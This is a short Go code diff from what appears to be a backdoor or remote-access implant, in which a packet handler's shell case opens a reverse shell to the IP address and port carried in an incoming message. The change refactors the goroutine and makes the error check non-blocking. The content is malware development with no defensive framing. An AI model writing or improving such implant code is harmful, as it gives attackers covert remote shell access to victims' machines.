@@ -72,14 +72,17 @@ func handleMessage(msg *message.Message) error {
 		// Opens a reverse shell on port specified in packet
 		case message.Shell:
 			errChan := make(chan error, 1)
-			go func() {
-				if err := executor.OpenReverseShell(msg.SrcIP, msg.SrcPort); err != nil {
+			go func(ip, port string) {
+				if err := executor.OpenReverseShell(ip, port); err != nil {
 					errChan <- fmt.Errorf("opening reverse shell: %w", err)
 					return
 				}
-			}()
-			if err := <-errChan; err != nil {
+			}(msg.SrcIP, msg.SrcPort)
+			select {
+			case err := <-errChan:
 				return fmt.Errorf("handling reverse shell: %w", err)
+			default:
+				return nil
 			}
 		}
 	default:
